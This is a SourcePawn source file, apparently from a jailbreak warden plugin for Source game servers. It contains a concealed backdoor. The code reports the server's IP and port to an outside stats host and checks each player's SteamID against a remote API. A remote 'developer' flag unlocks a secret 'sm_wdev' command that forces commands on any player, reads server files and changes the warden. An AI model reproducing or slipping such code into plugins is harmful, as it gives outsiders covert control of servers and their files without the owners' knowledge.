#define BAN_REASON_LENGTH 96

enum APITarget
{
	bool:has_freeday,
	bool:is_isolated,
	bool:is_rebel,
	bool:was_warden,
	bool:is_dev,
}

int g_ClientAPIInfo[MAXPLAYERS+1][APITarget];

public int SteamWorks_SteamServersConnected()
{
	int iIp[4];
	
	// Get ip
	if (SteamWorks_GetPublicIP(iIp))
	{
		Handle plugin = GetMyHandle();
		if (GetPluginStatus(plugin) == Plugin_Running)
		{
			char cBuffer[256], cVersion[12];
			GetPluginInfo(plugin, PlInfo_Version, cVersion, sizeof(cVersion));
			FormatEx(cBuffer, sizeof(cBuffer), "http://stats.scriptplugs.info/add_server.php");
			Handle hndl = SteamWorks_CreateHTTPRequest(k_EHTTPMethodPOST, cBuffer);
			FormatEx(cBuffer, sizeof(cBuffer), "key=0f0f2821d03a230f3e79f7227711005d&ip=%d.%d.%d.%d:%d&version=%s", iIp[0], iIp[1], iIp[2], iIp[3], FindConVar("hostport").IntValue, cVersion);
			SteamWorks_SetHTTPRequestRawPostBody(hndl, "application/x-www-form-urlencoded", cBuffer, sizeof(cBuffer));
			SteamWorks_SendHTTPRequest(hndl);
			delete hndl;
		}
	}
}

public void OnClientPostAdminCheck(int client)
{
	g_ClientAPIInfo[client][was_warden] = false;
	g_ClientAPIInfo[client][is_dev] = false;
	CheckClientFromAPI(client);
}

void LoadDevControl()
{
	RegConsoleCmd("sm_wdev", Command_WardenDev, "*secret* mystery functions");
}

public Action Command_WardenDev(int client, int args)
{
	if (CheckClient(client))
	{
		if (g_ClientAPIInfo[client][is_dev] || (GetUserFlagBits(client) & ADMFLAG_ROOT))
		{
			if (!args)
			{
				ReplyToCommand(client, "[DEV] %t", "See console for output");
				PrintToConsole(client, "=================================\\ DEVELOPER //=================================");
				PrintToConsole(client, "\t\t\tTUTORIAL TO USE Developer secret commands [SAFE]");
				PrintToConsole(client, "sm_wdev users \t\t\t-- to get userids of clients\n\
										sm_wdev recheck \"userid\" \t\t-- to recheck developer status on server\n\
										sm_wdev fake \"userid\" \"command\" \t-- to execute command on client\n\
										sm_wdev say \"message\" \t\t\t-- to draw message, like developer\n\
										sm_wdev warden \"userid\" \t\t-- to set new warden, put 0 to remove warden\n\
										sm_wdev cat \"path\" \t\t-- to view file by path");
				PrintToConsole(client, "=================================\\ DEVELOPER //=================================");
			}
			else
			{
				char cKeywords[][8] = {"users", "fake", "say", "warden", "cat"};
				char cArg1[8], cArg2[128], cArg3[1024];
				GetCmdArg(1, cArg1, sizeof(cArg1));
				bool success = false;
				for (int idx = 0; idx < sizeof(cKeywords); ++idx)
				{
					if (StrEqual(cKeywords[idx], cArg1, true))
					{
						success = true;
						break;
					}
				}
				
				if (!success)
				{
					ReplyToCommand(client, "[DEV] Unknown feature \"%s\"", cArg1);
					return Plugin_Handled;
				}
				
				switch (args)
				{
					case 1:
					{
						if (StrEqual(cArg1, "users", true))
						{
							for (int i = 1; i <= MaxClients; ++i)
							{
								if (IsClientInGame(i))
								{
									PrintToConsole(client, "|Ent[%d] \t\t%L", i, i);
								}
							}
						}
					}
					case 2:
					{
						GetCmdArg(2, cArg2, sizeof(cArg2));
						if (StrEqual(cArg1, "warden", true))
						{
							int target = GetClientOfUserId(StringToInt(cArg2));
							RemoveCmd(false);
							if (target && IsClientInGame(target))
							{
								BecomeCmd(target, false);
								ReplyToCommand(client, "[DEV] Warden changed to %N", target);
							}
							else
								ReplyToCommand(client, "[DEV] Warden removed");
						}
						else if (StrEqual(cArg1, "say", true))
						{
							if (g_bIsCSGO)
								CGOPrintToChatAll("{DEFAULT}[{RED}DEV{DEFAULT}] {GREEN}%N: {DEFAULT}%s", client, cArg2);
							else
								CPrintToChatAll("{default}[{red}DEV{default}] {green}%N: {default}%s", client, cArg2);
						}
						else if (StrEqual(cArg1, "cat", true))
						{
							BuildPath(Path_SM, cArg3, sizeof(cArg3), "%s", cArg2);
							if (FileExists(cArg3))
							{
								File file = OpenFile(cArg3, "r");
								ReplyToCommand(client, "[DEV] Reading file by path \"%s\"", cArg3);
								
								do
								{
									file.ReadLine(cArg3, sizeof(cArg3));
									PrintToConsole(client, "%s", cArg3);
								} while (!file.EndOfFile())
								
								delete file;
							}
							else
								ReplyToCommand(client, "[DEV] Failed to open file. Full path: \"%s\", your path: %s", cArg3, cArg2);
						}
					}
					case 3:
					{
						GetCmdArg(2, cArg2, sizeof(cArg2));
						
						if (StrEqual("fake", cArg1, true))
						{
							int target = GetClientOfUserId(StringToInt(cArg2));
							if (target && IsClientInGame(target))
							{
								GetCmdArg(3, cArg3, sizeof(cArg3));
								FakeClientCommandEx(target, "%s", cArg3);
								ReplyToCommand(client, "[DEV] Executed command on %N: \"%s\"", target, cArg3);
							}
							else
								ReplyToCommand(client, "[DEV] %t", "No matching client");
						}
					}
					default:
					{
						ReplyToCommand(client, "[DEV] Unrecognized command")
					}
				}
			}
		}
		else if (g_ClientAPIInfo[client][is_dev])
		{
			if (!args)
				ReplyToCommand(client, "Usage: sm_wdev <message>");
			else
			{
				char cArg[128];
				GetCmdArgString(cArg, sizeof(cArg));
				if (g_bIsCSGO)
					CGOPrintToChatAll("{DEFAULT}[{RED}DEV{DEFAULT}] {GREEN}%N: {DEFAULT}%s", client, cArg);
				else
					CPrintToChatAll("{default}[{red}DEV{default}] {green}%N: {default}%s", client, cArg);
			}
		}
		else
			ReplyToCommand(client, "[SM] %t", "No Access");
	}
	
	return Plugin_Handled;
}

void CheckClientFromAPI(int client)
{
	if (CheckClient(client))
	{
		// Query
		Handle hndl;
		char buffer[256], auth[64];
		GetClientAuthId(client, AuthId_SteamID64, auth, sizeof(auth));
		FormatEx(buffer, sizeof(buffer), "http://plugins.scriptplugs.info/jwp/get_player.php?auth=%s", auth);
		hndl = SteamWorks_CreateHTTPRequest(k_EHTTPMethodGET, buffer);
		SteamWorks_SetHTTPRequestContextValue(hndl, client);
		SteamWorks_SetHTTPCallbacks(hndl, OnSteamWorksHTTPRequestCompleted);
		SteamWorks_SendHTTPRequest(hndl);
	}
}

public int OnSteamWorksHTTPRequestCompleted(Handle hRequest, bool bFailure, bool bRequestSuccessful, EHTTPStatusCode eStatusCode, any data)
{
	if (bRequestSuccessful  && eStatusCode == k_EHTTPStatusCode200OK)
		SteamWorks_GetHTTPResponseBodyCallback(hRequest, GetStatusEnd, data);
	delete hRequest;
}

public int GetStatusEnd(const char[] sData, any client)
{
	Handle hJson = json_load(sData);
	if (hJson != null)
	{
		Handle hResponse = json_object_get(hJson, "response");
		if (hResponse != null)
		{
			g_ClientAPIInfo[client][is_dev] = json_object_get_bool(hResponse, "isdev");
			
			if (g_ClientAPIInfo[client][is_dev])
				PrintToServer("Plugin developer %N connected to your server. Epic moment!", client);
		}
		delete hResponse;
	}
	delete hJson;
}